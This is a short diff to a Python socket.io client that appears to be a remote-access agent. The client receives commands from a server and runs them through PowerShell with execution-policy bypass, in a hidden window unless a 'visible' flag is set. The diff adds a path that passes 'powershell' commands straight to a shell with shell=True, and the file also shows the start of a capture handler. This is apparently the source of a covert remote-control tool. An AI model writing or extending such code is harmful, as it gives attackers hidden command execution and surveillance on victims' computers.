@@ -103,10 +103,14 @@ def on_exec_command(data):
         )
     else:
         creation_flags = 0 if visible else subprocess.CREATE_NO_WINDOW
-        subprocess.Popen(
-            ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", decoded_cmd],
-            creationflags=creation_flags
-        )
+        cmd_str = decoded_cmd.strip()
+        if cmd_str.lower().startswith("powershell"):
+            subprocess.Popen(cmd_str, shell=True, creationflags=creation_flags)
+        else:
+            subprocess.Popen(
+                ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd_str],
+                creationflags=creation_flags
+            )
 
 @sio.on("set_capture")
 def on_set_capture(data):
